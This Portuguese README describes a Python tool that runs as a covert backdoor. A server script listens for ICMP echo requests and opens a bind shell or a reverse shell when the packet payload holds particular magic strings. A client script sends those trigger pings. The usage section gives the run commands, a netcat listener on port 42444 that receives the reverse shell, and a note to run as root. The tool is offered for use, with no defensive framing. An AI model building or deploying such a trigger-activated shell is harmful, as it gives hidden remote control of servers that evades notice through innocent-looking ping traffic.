# Descrição

Sistema que abre um shell de comando no servidor a partir da solicitação transmitida via pacotes ICMP do tipo ICMP_ECHO_REQUEST com comandos em seu payload.

## Servidor
* `icmp_active_shell.py` captura pacotes ICMP do tipo ICMP_ECHO_REQUEST e verifica se no payload tem o comando para ativar um bind shell ou reverse shell.

## Cliente
* `icmp_send_cmd.py` monta um pacote ICMP do tipo ICMP_ECHO_REQUEST, adiciona o comando no payload e envia para o servidor.

## Como usar

**servidor** 

`python icmp_active_shell.py`

**cliente** 

`python icmp_send_cmd.py [servidor] [comando]` - comandos: `-*-ias-*-` (bind shell) | `-*-iars-*-` (reverse shell)

Para um shell reverso é necessário ficar ouvindo a porta 42444 no cliente, segue esquema abaixo utilizando o netcat:

`nc -l -p 42444`

Os comandos acima deverão ser executados com o usuário root.
